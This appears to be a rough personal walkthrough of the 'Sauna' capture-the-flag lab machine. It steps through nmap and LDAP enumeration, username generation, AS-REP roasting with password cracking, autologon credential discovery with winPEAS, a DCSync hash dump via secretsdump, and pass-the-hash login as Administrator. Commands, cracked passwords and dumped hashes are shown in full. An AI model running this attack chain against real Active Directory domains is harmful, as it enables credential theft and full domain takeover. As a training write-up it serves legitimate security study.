Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 23:04 EDT
Nmap scan report for 10.10.10.175
Host is up (0.13s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-21 10:08:09Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain:   , Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/20%Time=5EC5EFBA%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\                                        
SF:x04bind\0\0\x10\0\x03");                                                                                       
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows                                             
                                                                                                                  
Host script results:                                                                                              
|_clock-skew: 7h03m47s                                                                                            
| smb2-security-mode:                                                                                             
|   2.02:                                                                                                         
|_    Message signing enabled and required                                                                        
| smb2-time:                                                                                                      
|   date: 2020-05-21T10:10:34                                                                                     
|_  start_date: N/A                                                                                               
                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                    
Nmap done: 1 IP address (1 host up) scanned in 318.11 seconds                                  




attempted enum4linux 
no smb
no workgroup or domain
no users

Domain Name: EGOTISTICALBANK
Domain Sid: S-1-5-21-2966785786-3096785034-1186376766



root@kali:~/Downloads/tools/kerbrute# ldapsearch -x -h 10.10.10.175 -p 389 -b “dc=EGOTISTICAL-BANK,dc=LOCAL”
# extended LDIF
#
# LDAPv3
# base <“dc=EGOTISTICAL-BANK,dc=LOCAL”> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 10 Referral
text: 0000202B: RefErr: DSID-03100835, data 0, 1 access points
        ref 1: 'local��
 �'

ref:: bGRhcDovL2xvY2Fs4oCdL+KAnGRjPUVHT1RJU1RJQ0FMLUJBTkssZGM9TE9DQUzigJ0=

# numResponses: 1





https://activedirectorypro.com/active-directory-user-naming-convention/

https://zflemingg1.gitbook.io/undergrad-tutorials/useful-commands/powershell


```
namelist = ['Fergus Smith', 'Shaun Coins', 'Sophie Driver', 'Hugo Bear', 'Bowie Taylor', 'Steven Kerb']

f = open('userspython.txt', 'w')

for name in namelist:
    name = name.split()

    f.write(name[0] + '.'+name[1]+'\n')
    f.write(name[0][0]+name[1]+'\n')
    f.write(name[0][0:2]+name[1]+'\n')
    f.write(name[0][0:3]+name[1]+'\n')
f.close()
```


python3 GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ~/Downloads/sauna/userpython.txt -format john -outputfile Sauna -dc-ip 10.10.10.175

john Sauna --wordlists=/usr/share/wordlists/rockyou.txt 

root@kali:~/Downloads/tools/impacket/examples# john Sauna -show
$krb5asrep$FSmith@EGOTISTICAL-BANK.LOCAL:Thestrokes23


ruby evil-winrm -i 10.10.10.175 -u FSmith -p Thestrokes23


1b5520b98d97cf17f24122a55baf70cf



ROOT

*Evil-WinRM* PS C:\Users\FSmith\Desktop> net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr


used winPEAS.bat

-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] Files an registry that may contain credentials <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Searching specific files that may contains credentials.
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
Looking inside HKCU\Software\ORL\WinVNC3\Password
Looking inside HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4/password
Looking inside HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\WinLogon
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!


https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633

python3 secretsdump.py -just-dc-ntlm EGOTISTICALBANK/svc_loanmanager@Moneymakestheworldgoround!
doesnt work


python3 secretsdump.py -just-dc-ntlm EGOTISTICALBANK.LOCAL/svc_loanmgr@10.10.10.175
password: Moneymakestheworldgoround!
```
root@kali:~/Downloads/tools/impacket/examples# python3 secretsdump.py -just-dc-ntlm EGOTISTICALBANK.LOCAL/svc_loanmgr@10.10.10.175
Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:bf5124294cc4c12217741f1eb7d01104:::
[*] Cleaning up... 
```

root@kali:~/Downloads/tools/evil-winrm# ruby evil-winrm.rb -i 10.10.10.175 -u Administrator -p d9485863c1e9e05851aa40cbb4ab9dff

doesnt work because we are given a hash, not a password


root@kali:~/Downloads/tools/evil-winrm# ruby evil-winrm.rb -i 10.10.10.175 -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff

rooted!
f3ee04965c68257382e31502cc5e881f

d9485863c1e9e05851aa40cbb4ab9dff


https://medium.com/secstudent/using-john-the-ripper-with-lm-hashes-f757bd4fb094